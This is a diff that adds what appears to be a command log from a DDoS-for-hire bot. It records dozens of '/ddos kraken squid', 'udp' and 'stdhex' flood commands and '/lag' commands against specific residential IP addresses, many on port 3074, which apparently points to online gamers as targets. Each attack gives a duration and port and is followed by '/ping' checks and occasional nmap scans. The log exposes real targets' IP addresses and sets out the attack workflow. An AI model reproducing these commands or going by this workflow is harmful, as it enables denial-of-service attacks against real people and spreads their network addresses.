@@ -1,0 +1,69 @@
+/ddos kraken stdhex 98.230.82.182 120 51126
+/lag
+/lagstop
+/lag udp 174.23.19.197 10 20 100 3074
+/lag udp 174.23.19.197 10 30 80 3074
+/stoplag
+/lagstop
+/lag udp 174.23.19.197 10 30 80 3074
+/lagstop
+/lag udp  170.52.156.233 10 30 80 3074
+/lagstop
+/ddos kraken udp 170.52.156.233 300
+/ddos kraken stdhex 170.52.156.233 120 3074
+/ddos kraken stdhex  98.235.103.69 2400 3074
+/ping 98.235.103.69
+/ping 98.235.103.69
+/ddos kraken udp 73.130.167.105 300 54233
+/ping 73.130.167.105
+/ddos kraken bae 73.130.167.105 300 54233
+/ddos kraken vse73.130.167.105 300 54233
+/ddos kraken vse 73.130.167.105 300 54233
+/ddos godzilla dns 73.130.167.105 300 54233
+/ddos godzilla udp 73.130.167.105 300 54233
+/ddos udp 73.130.167.105 300 54233
+/ddos kraken udp 73.130.167.105 1000 54233
+/ping 73.130.167.105
+[Wed Jul 29 2020 08:39:45 GMT-1100 (Samoa Standard Time)] /ping 24.190.226.127
+[Wed Jul 29 2020 11:49:19 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 67.86.9.143 500
+[Wed Jul 29 2020 12:13:30 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 64.20.25.200 500
+[Wed Jul 29 2020 12:14:38 GMT-1100 (Samoa Standard Time)] /ping 64.20.25.200
+[Wed Jul 29 2020 12:15:13 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 64.20.25.200 500 53544
+[Wed Jul 29 2020 12:18:15 GMT-1100 (Samoa Standard Time)] /ping 64.20.25.200
+[Wed Jul 29 2020 13:09:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 100.4.3.214 1200 3074
+[Wed Jul 29 2020 13:12:43 GMT-1100 (Samoa Standard Time)] /ping 100.4.3..214
+[Wed Jul 29 2020 13:13:04 GMT-1100 (Samoa Standard Time)] /ping 100.4.3.214
+[Wed Jul 29 2020 13:40:47 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 108.53.58.218 1200
+[Wed Jul 29 2020 13:41:32 GMT-1100 (Samoa Standard Time)] /ping 108.53.58.218
+[Wed Jul 29 2020 13:43:10 GMT-1100 (Samoa Standard Time)] /nmapsv 108.53.58.218
+[Wed Jul 29 2020 13:43:27 GMT-1100 (Samoa Standard Time)] /nmapresult
+[Wed Jul 29 2020 13:43:54 GMT-1100 (Samoa Standard Time)] /nmapresult
+[Wed Jul 29 2020 13:44:30 GMT-1100 (Samoa Standard Time)] /ping 108.53.58.218
+[Wed Jul 29 2020 13:58:40 GMT-1100 (Samoa Standard Time)] /plan
+[Wed Jul 29 2020 15:51:20 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 97.80.214.108    1200 3074
+[Wed Jul 29 2020 15:52:02 GMT-1100 (Samoa Standard Time)] /ping 97.80.214.108
+[Wed Jul 29 2020 15:55:18 GMT-1100 (Samoa Standard Time)] /ping 97.80.214.108
+[Wed Jul 29 2020 16:03:14 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 24.211.185.60  2000 80
+[Wed Jul 29 2020 16:15:32 GMT-1100 (Samoa Standard Time)] /tr4p
+[Wed Jul 29 2020 17:00:54 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 104.59.49.240 400 80
+[Wed Jul 29 2020 17:01:51 GMT-1100 (Samoa Standard Time)] /ping 104.59.49.240
+[Wed Jul 29 2020 18:13:25 GMT-1100 (Samoa Standard Time)] /ddos kraken squid  99.74.16.212 1920 3074
+[Wed Jul 29 2020 18:28:51 GMT-1100 (Samoa Standard Time)] /ddos kraken squid  71.38.144.209 1920 49903
+[Wed Jul 29 2020 18:30:23 GMT-1100 (Samoa Standard Time)] /ping 71.38.144.209
+[Wed Jul 29 2020 18:36:52 GMT-1100 (Samoa Standard Time)] /ping     71.38.144.209
+[Wed Jul 29 2020 18:40:41 GMT-1100 (Samoa Standard Time)] /ping     71.38.144.209
+[Wed Jul 29 2020 20:14:16 GMT-1100 (Samoa Standard Time)] /lag 24.224.46.160
+[Wed Jul 29 2020 20:15:43 GMT-1100 (Samoa Standard Time)] /lag kraken squid 24.224.46.160 5 30 80 3074
+[Wed Jul 29 2020 20:16:14 GMT-1100 (Samoa Standard Time)] /lag squid 24.224.46.160 5 30 80 3074
+[Wed Jul 29 2020 20:20:20 GMT-1100 (Samoa Standard Time)] /checkservers
+[Wed Jul 29 2020 20:23:29 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 24.224.46.160  120 3074
+[Wed Jul 29 2020 20:48:01 GMT-1100 (Samoa Standard Time)] /ddos kraken squid  69.57.99.150 800 50298
+[Wed Jul 29 2020 21:59:30 GMT-1100 (Samoa Standard Time)] /ddos kraken squid  162.233.38.139 1600 3074
+[Wed Jul 29 2020 22:09:38 GMT-1100 (Samoa Standard Time)] /ddos kraken squid   73.161.102.253 3600 56261
+[Wed Jul 29 2020 22:12:26 GMT-1100 (Samoa Standard Time)] /ping 73.161.102.253
+[Wed Jul 29 2020 22:13:02 GMT-1100 (Samoa Standard Time)] /ping 73.161.102.253
+[Wed Jul 29 2020 22:14:07 GMT-1100 (Samoa Standard Time)] /ping 73.161.102.253
+[Wed Jul 29 2020 22:14:36 GMT-1100 (Samoa Standard Time)] /ddos kraken squid   73.161.102.253 3600 56261
+[Wed Jul 29 2020 22:15:08 GMT-1100 (Samoa Standard Time)] /ping     73.161.102.253
+[Wed Jul 29 2020 22:16:19 GMT-1100 (Samoa Standard Time)] /ping     73.161.102.253
+[Wed Jul 29 2020 22:18:02 GMT-1100 (Samoa Standard Time)] /checkservers
